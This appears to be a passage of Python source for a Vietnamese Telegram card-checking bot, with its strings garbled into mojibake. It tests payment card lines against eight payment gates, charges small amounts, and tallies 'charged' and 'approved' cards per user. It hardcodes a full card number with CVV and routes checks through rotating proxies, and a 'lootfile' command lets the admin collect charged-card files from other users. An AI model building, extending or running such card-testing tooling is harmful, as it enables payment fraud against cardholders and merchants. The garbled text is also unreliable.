        await update.message.reply_text("‚úÖ Hi·ªán kh√¥ng c√≥ t√°c v·ª• check n√†o ƒëang ch·∫°y.")
        return

    message = "üèÉ‚Äç‚ôÇÔ∏è **C√°c t√°c v·ª• ƒëang ho·∫°t ƒë·ªông:**\n\n"
    now = time.time()
    
    keyboard = []
    active_checks_copy = dict(ACTIVE_CHECKS)

    for user_id, data in active_checks_copy.items():
        duration = now - data.get('start_time', now)
        username = f"@{data.get('username')}" if data.get('username') else "N/A"
        full_name = data.get('full_name', 'N/A')
        task_type = data.get('task_type', 'N/A').upper()
        
        message += (f"üë§ **User:** {full_name} ({username}) | ID: `{user_id}`\n"
                    f"   - **L·ªánh:** `/{task_type}`\n"
                    f"   - **Th·ªùi gian ch·∫°y:** `{int(duration)}` gi√¢y\n"
                    f"--------------------\n")
        
        # Add a stop button for each user
        keyboard.append([InlineKeyboardButton(f"üõë D·ª´ng Task c·ªßa {full_name}", callback_data=f"stop_task_{user_id}")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup)


def _perform_gate_check(gate_id: str, card_line: str):
    """H√†m helper ƒë·ªÉ ki·ªÉm tra m·ªôt c·ªïng c·ª• th·ªÉ, tr·∫£ v·ªÅ (tr·∫°ng th√°i, ph·∫£n h·ªìi)"""
    cc, mes, ano, cvv = card_line.split('|')
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    session = requests.Session()
    session.headers.update({"User-Agent": ua})
    
    # S·ª≠ d·ª•ng logic c·ªßa h√†m check_card nh∆∞ng r√∫t g·ªçn cho vi·ªác test
    try:
        # Gi·∫£ l·∫≠p bin_info tr·ªëng v√¨ kh√¥ng c·∫ßn check BIN cho l·ªánh status
        bin_info = {} 
        
        gate_functions = {
            '1': _check_card_gate1, '2': _check_card_gate2, '3': _check_card_gate3,
            '4': _check_card_gate4, '5': _check_card_gate5, '6': _check_card_gate6,
            '7': _check_card_gate7, '8': _check_card_gate8,
        }
        gate_func = gate_functions.get(gate_id)
        if not gate_func:
            return "Kh√¥ng x√°c ƒë·ªãnh ‚ùì", "Gate ID kh√¥ng t·ªìn t·∫°i"

        status, _, response_text, _ = gate_func(session, card_line, cc, mes, f"20{ano}", cvv, bin_info, ua, None)

        # Ph√¢n t√≠ch k·∫øt qu·∫£
        if status == 'gate_dead' or '{"message":"Forbidden"}' in str(response_text):
            return "Kh√¥ng ho·∫°t ƒë·ªông üî¥", response_text
        elif '"payment_status":"failed"' in str(response_text) or '"payment_source_status":"failed"' in str(response_text) or status == 'live_success' or status == 'success' or status == 'decline':
            return "Ho·∫°t ƒë·ªông üü¢", response_text
        else:
            # B·∫•t k·ª≥ ph·∫£n h·ªìi n√†o kh√°c t·ª´ server ƒë·ªÅu c√≥ nghƒ©a l√† n√≥ online
            return "Ho·∫°t ƒë·ªông üü¢", response_text

    except Exception as e:
        logger.error(f"L·ªói khi ki·ªÉm tra tr·∫°ng th√°i Gate {gate_id}: {e}")
        return "Kh√¥ng ho·∫°t ƒë·ªông üî¥", str(e)


async def status_command(update, context):
    """Ki·ªÉm tra tr·∫°ng th√°i ho·∫°t ƒë·ªông c·ªßa c√°c c·ªïng thanh to√°n."""
    if update.effective_user.id != ADMIN_ID: return
    
    msg = await update.message.reply_text("‚è≥ ƒêang ki·ªÉm tra tr·∫°ng th√°i c√°c c·ªïng... Vui l√≤ng ch·ªù.")
    
    test_card = "4258818143133540|02|26|471" # M·ªôt th·∫ª test chung

    final_message = "**üìä TR·∫†NG TH√ÅI C·ªîNG THANH TO√ÅN üìä**\n\n"
    gate_ids = ['1', '2', '3', '4', '5', '6', '7', '8']
    
    with ThreadPoolExecutor(max_workers=len(gate_ids)) as executor:
        future_to_gate = {executor.submit(_perform_gate_check, gid, test_card): gid for gid in gate_ids}
        results = {}
        for future in as_completed(future_to_gate):
            gid = future_to_gate[future]
            try:
                status, response = future.result()
                results[gid] = (status, response)
            except Exception as e:
                results[gid] = ("L·ªói ki·ªÉm tra üî¥", str(e))

    for gid in gate_ids:
        status, response = results.get(gid, ("Kh√¥ng x√°c ƒë·ªãnh", "Kh√¥ng c√≥ k·∫øt qu·∫£"))
        response_display = str(response)[:1000] # C·∫Øt b·ªõt response
        gate_name = get_formatted_gate_name(gid)

        final_message += (
            f"**C·ªïng {gid}: {gate_name.split('(')[0].strip()}**\n"
            f"**Tr·∫°ng th√°i:** {status}\n"
            f"**Ph·∫£n h·ªìi Server:**\n```\n{response_display}\n```\n"
            f"----------------------------------------\n"
        )

    await msg.edit_text(final_message)


async def gate_command(update, context):
    """L·ªánh thay ƒë·ªïi c·ªïng check (ch·ªâ d√†nh cho Admin)."""
    if update.effective_user.id != ADMIN_ID: return
    
    if not context.args:
        current_gate = get_active_gate()
        current_gate_name = get_formatted_gate_name(current_gate)
        await update.message.reply_text(f"‚ÑπÔ∏è Gate ƒëang ho·∫°t ƒë·ªông: **{current_gate_name}**.\n\nD√πng `/gate [1-8]` ƒë·ªÉ thay ƒë·ªïi.")
        return
        
    new_gate = context.args[0]
    # <<<--- C·∫¨P NH·∫¨T: LOGIC M·ªöI CHO GATE 8 ---<<<
    if new_gate == '8':
        keyboard = [
            [
                InlineKeyboardButton("üí∞ Charge", callback_data="setgate8mode_charge"),
                InlineKeyboardButton("‚ö° Check Live", callback_data="setgate8mode_live"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Vui l√≤ng ch·ªçn ch·∫ø ƒë·ªô cho **Gate 8**:",
            reply_markup=reply_markup
        )
    # >>>--- K·∫æT TH√öC C·∫¨P NH·∫¨T ---<<<
    elif new_gate in ['1', '2', '3', '4', '5', '6', '7']:
        set_active_gate(new_gate)
        new_gate_name = get_formatted_gate_name(new_gate)
        await update.message.reply_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
    else:
        await update.message.reply_text("‚ùå C·ªïng kh√¥ng h·ª£p l·ªá. Vui l√≤ng ch·ªçn `1`, `2`, `3`, `4`, `5`, `6`, `7` ho·∫∑c `8`.")

async def set_gate_range_command(update, context):
    """(Admin) ƒê·∫∑t kho·∫£ng charge cho m·ªôt gate. /setgate <id> <min> <max>"""
    if update.effective_user.id != ADMIN_ID: return
        
    if len(context.args) != 3:
        await update.message.reply_text("C√∫ ph√°p: `/setgate <gate_id> <min_amount> <max_amount>`\nV√≠ d·ª•: `/setgate 1 50 200` (charge t·ª´ 0.5$ ƒë·∫øn 2.0$)")
        return
        
    try:
        gate_id, min_str, max_str = context.args
        if gate_id not in ['1', '2', '3', '4', '5', '6', '7', '8']:
            await update.message.reply_text("‚ùå `gate_id` ph·∫£i t·ª´ 1 ƒë·∫øn 8.")
            return
        min_val = int(min_str)
        max_val = int(max_str)
        if min_val > max_val:
            await update.message.reply_text("‚ùå `min_amount` kh√¥ng ƒë∆∞·ª£c l·ªõn h∆°n `max_amount`.")
            return
        if min_val < 0 or max_val < 0:
            await update.message.reply_text("‚ùå S·ªë ti·ªÅn ph·∫£i l√† s·ªë d∆∞∆°ng.")
            return
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå D·ªØ li·ªáu kh√¥ng h·ª£p l·ªá. Vui l√≤ng nh·∫≠p s·ªë cho min v√† max.")
        return

    ranges = load_json_file(GATE_RANGES_FILE)
    ranges[gate_id] = {"min": min_val, "max": max_val}
    save_json_file(GATE_RANGES_FILE, ranges)
    
    new_gate_name = get_formatted_gate_name(gate_id)
    await update.message.reply_text(f"‚úÖ ƒê√£ c·∫≠p nh·∫≠t th√†nh c√¥ng!\n**Gate {gate_id}** gi·ªù s·∫Ω charge ng·∫´u nhi√™n trong kho·∫£ng **{min_val/100:.2f}$ - {max_val/100:.2f}$**.\nT√™n hi·ªÉn th·ªã m·ªõi: `{new_gate_name}`")


async def turn_bot_off(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not is_bot_on():
        await update.message.reply_text("‚ÑπÔ∏è Bot ƒë√£ ·ªü tr·∫°ng th√°i **T·∫Øt** r·ªìi."); return

    set_bot_status(False)
    await update.message.reply_text("‚úÖ ƒê√£ **T·∫ÆT** bot. B·∫Øt ƒë·∫ßu g·ª≠i th√¥ng b√°o...")

    authorized_users = load_users()
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        lang = get_user_lang(user_id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Kh√¥ng th·ªÉ g·ª≠i th√¥ng b√°o t·∫Øt bot cho user {user_id}: {e}")
        await asyncio.sleep(0.1) 
    
    await update.message.reply_text(f"üì¢ Th√¥ng b√°o b·∫£o tr√¨ ƒë√£ ƒë∆∞·ª£c g·ª≠i.\n- Th√†nh c√¥ng: {success_count}\n- Th·∫•t b·∫°i: {fail_count}")

async def turn_bot_on(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if is_bot_on():
        await update.message.reply_text("‚ÑπÔ∏è Bot ƒë√£ ·ªü tr·∫°ng th√°i **B·∫≠t** r·ªìi."); return
    
    set_bot_status(True)
    await update.message.reply_text("‚úÖ ƒê√£ **B·∫¨T** bot. B·∫Øt ƒë·∫ßu g·ª≠i th√¥ng b√°o...")

    authorized_users = load_users()
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        lang = get_user_lang(user_id) or 'en'
        message = MESSAGES_VI["bot_on"] if lang == 'vi' else MESSAGES_EN["bot_on"]
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Kh√¥ng th·ªÉ g·ª≠i th√¥ng b√°o b·∫≠t bot cho user {user_id}: {e}")
        await asyncio.sleep(0.1)

    await update.message.reply_text(f"üì¢ Th√¥ng b√°o ho·∫°t ƒë·ªông ƒë√£ ƒë∆∞·ª£c g·ª≠i.\n- Th√†nh c√¥ng: {success_count}\n- Th·∫•t b·∫°i: {fail_count}")

async def send_message_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    
    if len(context.args) < 2:
        await update.message.reply_text("C√∫ ph√°p: `/send <user_id> <tin_nh·∫Øn>`"); return
        
    try: target_user_id = int(context.args[0])
    except ValueError: await update.message.reply_text("‚ùå User ID kh√¥ng h·ª£p l·ªá."); return
        
    message_to_send = " ".join(context.args[1:])
    
    try:
        await context.bot.send_message(chat_id=target_user_id, text=f"‚úâÔ∏è **Tin nh·∫Øn t·ª´ Admin:**\n\n{message_to_send}")
        await update.message.reply_text(f"‚úÖ Tin nh·∫Øn ƒë√£ ƒë∆∞·ª£c g·ª≠i ƒë·∫øn user `{target_user_id}`.")
    except Exception as e:
        await update.message.reply_text(f"‚ùå G·ª≠i tin nh·∫Øn th·∫•t b·∫°i: `{e}`")

async def send_all_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    
    if not context.args:
        await update.message.reply_text("C√∫ ph√°p: `/sendall <tin_nh·∫Øn>`"); return
        
    message_to_send = " ".join(context.args)
    authorized_users = load_users()
    
    if not authorized_users:
        await update.message.reply_text("‚ÑπÔ∏è Kh√¥ng c√≥ th√†nh vi√™n n√†o ƒë·ªÉ g·ª≠i tin."); return
        
    await update.message.reply_text(f"üì¢ B·∫Øt ƒë·∫ßu g·ª≠i tin nh·∫Øn ƒë·∫øn `{len(authorized_users)}` th√†nh vi√™n...")
    
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=f"üì¢ **Th√¥ng b√°o t·ª´ Admin:**\n\n{message_to_send}")
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Kh√¥ng th·ªÉ g·ª≠i broadcast ƒë·∫øn user {user_id}: {e}")
        await asyncio.sleep(0.1)
        
    await update.message.reply_text(f"üèÅ G·ª≠i tin nh·∫Øn ho√†n t·∫•t!\n- Th√†nh c√¥ng: `{success_count}`\n- Th·∫•t b·∫°i: `{fail_count}`")

async def show_check_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    stats = load_json_file(STATS_FILE)
    if not stats:
        await update.message.reply_text("Ch∆∞a c√≥ d·ªØ li·ªáu th·ªëng k√™ n√†o."); return
    
    message = "üìä **TH·ªêNG K√ä CHECK C·ª¶A USER** üìä\n\n"
    all_users_to_show = load_users(); all_users_to_show.add(ADMIN_ID)

    for user_id in sorted(list(all_users_to_show)):
        user_id_str = str(user_id)
        data = stats.get(user_id_str)
        if isinstance(data, dict):
            username = data.get('username')
            user_display = f"@{escape_markdown(str(username))}" if username else f"ID: {user_id_str}"
            message += (f"üë§ **{user_display}** (`{user_id_str}`)\n"
                        f"  ‚úÖ Charged: `{data.get('total_charged', 0)}`\n"
                        f"  ‚úÖ Approved: `{data.get('total_live_success', 0)}`\n"
                        f"  üîí Custom: `{data.get('total_custom', 0)}`\n"
                        f"  ‚ùå Declined: `{data.get('total_decline', 0)}`\n"
                        f"  ‚ùî L·ªói: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
                        f"  üïí L·∫ßn cu·ªëi: `{data.get('last_check_timestamp', 'Ch∆∞a check')}`\n"
                        f"--------------------\n")
        else:
            message += (f"üë§ **ID: {user_id_str}**\n"
                        f"  *Ch∆∞a t·ª´ng check ho·∫∑c d·ªØ li·ªáu l·ªói.*\n"
                        f"--------------------\n")
    
    if len(message) > 4096:
        with io.BytesIO(message.encode('utf-8')) as doc:
            await update.message.reply_document(document=doc, filename="stats.txt")
    else:
        await update.message.reply_text(message)


async def loot_file_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("C√∫ ph√°p: `/lootfile <user_id>`"); return
    
    target_user_id = context.args[0]
    user_log_dir = os.path.join(LOG_DIR, target_user_id)
    
    if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
        await update.message.reply_text(f"Kh√¥ng t√¨m th·∫•y l·ªãch s·ª≠ check cho user `{target_user_id}`."); return
        
    keyboard = [
        [InlineKeyboardButton("1. L·∫•y File Charge G·∫ßn Nh·∫•t", callback_data=f"loot_latestcharge_{target_user_id}")],
        [InlineKeyboardButton("2. L·∫•y T·∫•t C·∫£ File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
        [InlineKeyboardButton("3. Ch·ªçn T·ª´ L·ªãch S·ª≠", callback_data=f"loot_history_{target_user_id}")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Ch·ªçn t√πy ch·ªçn ƒë·ªÉ l·∫•y file c·ªßa user `{target_user_id}`:", reply_markup=reply_markup)

# <<<--- C√ÅC L·ªÜNH SITE CHECKER ---<<<
async def site_command(update, context):
    """X·ª≠ l√Ω l·ªánh /site ƒë·ªÉ check m·ªôt website."""
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return

    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return

    if not context.args:
        await update.message.reply_text("S·ª≠ d·ª•ng: `/site <website.com>`")
        return

    url_input = context.args[0]
    msg = await update.message.reply_text(f"‚è≥ ƒêang ki·ªÉm tra trang `{url_input}`...")

    try:
        # Ch·∫°y h√†m blocking trong m·ªôt thread ri√™ng ƒë·ªÉ kh√¥ng ch·∫∑n bot
        result_message = await asyncio.to_thread(perform_website_check, url_input, user)
        await msg.edit_text(result_message, disable_web_page_preview=True)
    except Exception as e:
        logger.error(f"L·ªói trong /site command: {e}", exc_info=True)
        await msg.edit_text(f"‚õîÔ∏è **L·ªói H·ªá Th·ªëng khi check site:**\n`{e}`")

async def sitem_command(update, context):
    """X·ª≠ l√Ω l·ªánh /sitem ƒë·ªÉ check nhi·ªÅu website."""
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return

    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return

    text_content = update.message.text.split('/sitem', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("S·ª≠ d·ª•ng: `/sitem` v√† d√°n danh s√°ch website ·ªü d√≤ng d∆∞·ªõi."); return

    # T√¨m t·∫•t c·∫£ c√°c URL trong tin nh·∫Øn
    url_pattern = r'(https?://)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
    urls_to_check = [match[0] + match[1] for match in re.findall(url_pattern, text_content)]
    
    if not urls_to_check:
        await update.message.reply_text("Kh√¥ng t√¨m th·∫•y URL h·ª£p l·ªá n√†o ƒë·ªÉ check."); return

    max_urls = 10
    if len(urls_to_check) > max_urls:
        await update.message.reply_text(f"‚ö†Ô∏è Qu√° nhi·ªÅu URL. Ch·ªâ x·ª≠ l√Ω {max_urls} URL ƒë·∫ßu ti√™n.")
        urls_to_check = urls_to_check[:max_urls]

    await update.message.reply_text(f"üöÄ B·∫Øt ƒë·∫ßu ki·ªÉm tra `{len(urls_to_check)}` trang web...")

    for url in urls_to_check:
        try:
            result_message = await asyncio.to_thread(perform_website_check, url, user)
            await update.message.reply_text(result_message, disable_web_page_preview=True)
        except Exception as e:
            logger.error(f"L·ªói khi check URL {url} trong /sitem: {e}", exc_info=True)
            await update.message.reply_text(f"‚õîÔ∏è L·ªói khi check `{url}`: `{e}`")
        await asyncio.sleep(1) # Th√™m ƒë·ªô tr·ªÖ ƒë·ªÉ tr√°nh flood
# >>>--- END ---<<<

# --- L·ªÜNH QU·∫¢N L√ù PROXY ---
async def on_proxy_command(update, context):
    """(Admin) B·∫≠t ch·∫ø ƒë·ªô s·ª≠ d·ª•ng proxy."""
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies()
    proxies['enabled'] = True
    save_proxies(proxies)
    await update.message.reply_text("‚úÖ ƒê√£ **B·∫¨T** ch·∫ø ƒë·ªô s·ª≠ d·ª•ng proxy. C√°c l·∫ßn check th·∫ª s·∫Ω ƒë∆∞·ª£c th·ª±c hi·ªán qua proxy ng·∫´u nhi√™n.")

async def off_proxy_command(update, context):
    """(Admin) T·∫Øt ch·∫ø ƒë·ªô s·ª≠ d·ª•ng proxy."""
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies()
    proxies['enabled'] = False
    save_proxies(proxies)
    await update.message.reply_text("‚òëÔ∏è ƒê√£ **T·∫ÆT** ch·∫ø ƒë·ªô s·ª≠ d·ª•ng proxy. C√°c l·∫ßn check s·∫Ω kh√¥ng d√πng proxy.")

async def add_proxy_command(update, context):
    """(Admin) Th√™m proxy m·ªõi v√†o danh s√°ch."""
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("C√∫ ph√°p: `/addprx <proxy>`\nV√≠ d·ª•: `/addprx 123.45.67.89:8080` ho·∫∑c `/addprx ip:port:user:pass`")
        return

    proxy_str = context.args[0]
    parts = proxy_str.split(':')
    if len(parts) not in [2, 4]:
        await update.message.reply_text("‚ùå **ƒê·ªãnh d·∫°ng kh√¥ng h·ª£p l·ªá.** Vui l√≤ng s·ª≠ d·ª•ng `ip:port` ho·∫∑c `ip:port:user:pass`.")
        return

    msg = await update.message.reply_text(f"‚è≥ ƒêang ki·ªÉm tra proxy `{proxy_str}`...")
    is_working, reason = await asyncio.to_thread(_test_proxy, proxy_str)

    if not is_working:
        await msg.edit_text(f"‚ùå **Proxy kh√¥ng ho·∫°t ƒë·ªông.**\nL√Ω do: `{reason}`\nProxy ch∆∞a ƒë∆∞·ª£c th√™m v√†o danh s√°ch.")
        return

    proxies = load_proxies()
    if proxy_str in proxies['proxies']:
        await msg.edit_text(f"‚ÑπÔ∏è Proxy `{proxy_str}` ƒë√£ t·ªìn t·∫°i trong danh s√°ch.")
        return
        
    proxies['proxies'].append(proxy_str)
    save_proxies(proxies)
    await msg.edit_text(f"‚úÖ **Proxy ho·∫°t ƒë·ªông t·ªët v√† ƒë√£ ƒë∆∞·ª£c th√™m!**\n- Proxy: `{proxy_str}`\n- T·ªïng s·ªë proxy hi·ªán c√≥: `{len(proxies['proxies'])}`")

async def delete_proxy_command(update, context):
    """(Admin) Hi·ªÉn th·ªã danh s√°ch proxy ƒë·ªÉ x√≥a."""
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies().get('proxies', [])
    if not proxies:
        await update.message.reply_text("üì≠ Danh s√°ch proxy tr·ªëng.")
        return
    
    keyboard = []
    for i, proxy in enumerate(proxies):
        keyboard.append([InlineKeyboardButton(f"üóëÔ∏è {proxy}", callback_data=f"delprx_{i}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Ch·ªçn proxy ƒë·ªÉ x√≥a:", reply_markup=reply_markup)

async def test_proxy_command(update, context):
    """(Admin) Hi·ªÉn th·ªã danh s√°ch proxy ƒë·ªÉ ki·ªÉm tra."""
    if update.effective_user.id != ADMIN_ID: return
    proxies_data = load_proxies()
    proxies = proxies_data.get('proxies', [])
    status = "B·∫≠t" if proxies_data.get('enabled') else "T·∫Øt"

    if not proxies:
        await update.message.reply_text(f"üì≠ Danh s√°ch proxy tr·ªëng.\nTr·∫°ng th√°i s·ª≠ d·ª•ng proxy: **{status}**")
        return
    
    keyboard = []
    for i, proxy in enumerate(proxies):
        keyboard.append([InlineKeyboardButton(f"üß™ {proxy}", callback_data=f"testprx_{i}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Ch·ªçn proxy ƒë·ªÉ ki·ªÉm tra (k·∫øt n·ªëi t·ªõi google.com):\nTr·∫°ng th√°i s·ª≠ d·ª•ng proxy: **{status}**", reply_markup=reply_markup)
# --- K·∫æT TH√öC L·ªÜNH PROXY ---

async def button_handler(update, context):
    query = update.callback_query
    
    user_from_callback = query.from_user
    data = query.data.split('_')
    command = data[0]
    
    # --- X·ª≠ l√Ω n√∫t ch·ªçn ng√¥n ng·ªØ ---
    if command == "setlang":
        await query.answer()
        lang_code = data[1]
        set_user_lang(user_from_callback.id, lang_code)
        help_text = await get_help_text(user_from_callback, lang_code)
        await query.edit_message_text(help_text, disable_web_page_preview=True)
        return

    # <<<--- T√çNH NƒÇNG M·ªöI: CH·ªåN CH·∫æ ƒê·ªò GATE 8 ---<<<
    if command == "setgate8mode":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True)
            return
        
        mode = data[1] # 'charge' or 'live'
        set_gate8_mode(mode)
        set_active_gate('8') # Ch·∫Øc ch·∫Øn r·∫±ng gate 8 ƒëang ƒë∆∞·ª£c ch·ªçn
        
        new_gate_name = get_formatted_gate_name('8')
        await query.answer(f"ƒê√£ ƒë·ªïi sang {new_gate_name}")
        await query.edit_message_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
        return
    # >>>--- K·∫æT TH√öC T√çNH NƒÇNG M·ªöI ---<<<

    # --- X·ª≠ l√Ω c√°c n√∫t d·ª´ng task ---
    if command == "stop":
        await query.answer()
        action = data[1] # 'task' ho·∫∑c 'mytask'
        target_user_id = int(data[2])

        # Admin c√≥ th·ªÉ d·ª´ng task c·ªßa b·∫•t k·ª≥ ai
        if action == "task" and user_from_callback.id == ADMIN_ID:
            if target_user_id in CANCELLATION_EVENTS:
                CANCELLATION_EVENTS[target_user_id].set()
                await query.edit_message_text(f"‚úÖ ƒê√£ g·ª≠i y√™u c·∫ßu d·ª´ng t√°c v·ª• cho ng∆∞·ªùi d√πng `{target_user_id}`.")
            else:
                await query.edit_message_text(f"‚ÑπÔ∏è T√°c v·ª• c·ªßa ng∆∞·ªùi d√πng `{target_user_id}` ƒë√£ k·∫øt th√∫c ho·∫∑c kh√¥ng t·ªìn t·∫°i.", reply_markup=None)
        
        # User ch·ªâ c√≥ th·ªÉ d·ª´ng task c·ªßa ch√≠nh m√¨nh
        elif action == "mytask" and user_from_callback.id == target_user_id:
            if target_user_id in CANCELLATION_EVENTS:
                CANCELLATION_EVENTS[target_user_id].set()
                await query.edit_message_text("‚è≥ ƒê√£ g·ª≠i y√™u c·∫ßu d·ª´ng. T√°c v·ª• s·∫Ω s·ªõm d·ª´ng l·∫°i...", reply_markup=None)
            else:
                await query.edit_message_text("‚ÑπÔ∏è T√°c v·ª• c·ªßa b·∫°n ƒë√£ k·∫øt th√∫c ho·∫∑c kh√¥ng t·ªìn t·∫°i.", reply_markup=None)
        
        else:
                await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán h√†nh ƒë·ªông n√†y.", show_alert=True)
        return

    # --- X·ª¨ L√ù N√öT PROXY (CH·ªà ADMIN) ---
    if command == "delprx":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        
        try:
            proxy_index = int(data[1])
            proxies_data = load_proxies()
            
            if 0 <= proxy_index < len(proxies_data['proxies']):
                deleted_proxy = proxies_data['proxies'].pop(proxy_index)
                save_proxies(proxies_data)
                await query.answer(f"ƒê√£ x√≥a proxy: {deleted_proxy}")
                
                # C·∫≠p nh·∫≠t l·∫°i danh s√°ch n√∫t b·∫•m
                new_keyboard = []
                if proxies_data['proxies']:
                    for i, proxy in enumerate(proxies_data['proxies']):
                        new_keyboard.append([InlineKeyboardButton(f"üóëÔ∏è {proxy}", callback_data=f"delprx_{i}")])
                    reply_markup = InlineKeyboardMarkup(new_keyboard)
                    await query.edit_message_text("ƒê√£ x√≥a. Ch·ªçn proxy kh√°c ƒë·ªÉ x√≥a:", reply_markup=reply_markup)
                else:
                    await query.edit_message_text("ƒê√£ x√≥a proxy cu·ªëi c√πng. Danh s√°ch hi·ªán tr·ªëng.")
            else:
                await query.answer("L·ªói: Proxy kh√¥ng c√≤n t·ªìn t·∫°i.", show_alert=True)
        except (ValueError, IndexError) as e:
            logger.error(f"L·ªói khi x√≥a proxy: {e}")
            await query.answer("L·ªói khi x·ª≠ l√Ω y√™u c·∫ßu.", show_alert=True)
        return

    if command == "testprx":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        
        try:
            proxy_index = int(data[1])
            proxies_data = load_proxies()
            proxy_to_test = proxies_data['proxies'][proxy_index]
            
            await query.answer(f"ƒêang ki·ªÉm tra {proxy_to_test}...")
            is_working, reason = await asyncio.to_thread(_test_proxy, proxy_to_test)
            
            result_icon = "‚úÖ" if is_working else "‚ùå"
            await query.message.reply_text(f"**K·∫øt qu·∫£ ki·ªÉm tra Proxy:**\n{result_icon} `{proxy_to_test}`\n**L√Ω do:** `{reason}`")
            
        except (ValueError, IndexError) as e:
            logger.error(f"L·ªói khi test proxy: {e}")
            await query.answer("L·ªói: Kh√¥ng t√¨m th·∫•y proxy ƒë·ªÉ test.", show_alert=True)
        return
    # --- K·∫æT TH√öC X·ª¨ L√ù N√öT PROXY ---

    # --- C√°c n√∫t b·∫•m kh√°c (ch·ªâ Admin) ---
    await query.answer() # Tr·∫£ l·ªùi c√°c query kh√°c ƒë·ªÉ kh√¥ng b·ªã treo
    if user_from_callback.id != ADMIN_ID:
        await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán h√†nh ƒë·ªông n√†y.", show_alert=True); return
        
    action = data[1]
    target_user_id = data[2] if len(data) > 2 else None

    if command == "loot":
        if action == "mainmenu":
            keyboard = [
                [InlineKeyboardButton("1. L·∫•y File Charge G·∫ßn Nh·∫•t", callback_data=f"loot_latestcharge_{target_user_id}")],
                [InlineKeyboardButton("2. L·∫•y T·∫•t C·∫£ File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
                [InlineKeyboardButton("3. Ch·ªçn T·ª´ L·ªãch S·ª≠", callback_data=f"loot_history_{target_user_id}")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Ch·ªçn t√πy ch·ªçn ƒë·ªÉ l·∫•y file c·ªßa user `{target_user_id}`:", reply_markup=reply_markup)

        elif action == "latestcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
                await query.edit_message_text(f"Kh√¥ng c√≥ l·ªãch s·ª≠ check cho user `{target_user_id}`."); return
            
            latest_session = sorted(os.listdir(user_log_dir), reverse=True)[0]
            file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
            
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.edit_message_text(f"‚úÖ ƒê√£ g·ª≠i file charge g·∫ßn nh·∫•t t·ª´ session `{latest_session}`.")
            else:
                await query.edit_message_text(f"‚ÑπÔ∏è L·∫ßn check g·∫ßn nh·∫•t (`{latest_session}`) kh√¥ng c√≥ th·∫ª charge n√†o.")

        elif action == "allcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
